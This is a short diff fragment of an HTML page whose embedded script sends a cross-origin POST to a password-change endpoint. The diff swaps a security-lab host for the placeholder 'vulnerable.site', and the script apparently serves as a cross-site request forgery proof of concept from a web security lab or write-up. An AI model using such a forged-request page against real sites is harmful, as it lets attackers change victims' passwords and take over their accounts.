@@ -8,7 +8,7 @@
 <body>
  	<script>
  		$.ajax({
-  url: "https://o7axmiy49v.voorivex-lab.online/change_pass",
+  url: "https://vulnerable.site/change_pass",
   method: "POST",
   contentType: "application/x-www-form-urlencoded",
   data: {
